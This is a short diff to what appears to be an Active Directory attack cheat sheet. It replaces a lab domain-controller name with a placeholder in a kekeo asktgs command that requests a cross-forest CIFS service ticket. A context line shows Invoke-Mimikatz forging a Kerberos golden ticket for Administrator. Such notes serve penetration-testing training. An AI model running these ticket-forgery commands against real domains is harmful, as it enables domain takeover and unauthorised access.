@@ -1071,7 +1071,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain>
 
 #### Create a TGS for a service (kekeo_old)
 ```
-./asktgs.exe <kirbi file> CIFS/eurocorp-dc.eurocorp.local
+./asktgs.exe <kirbi file> CIFS/<crossforest dc name>
 ```
 
 #### Use the TGT
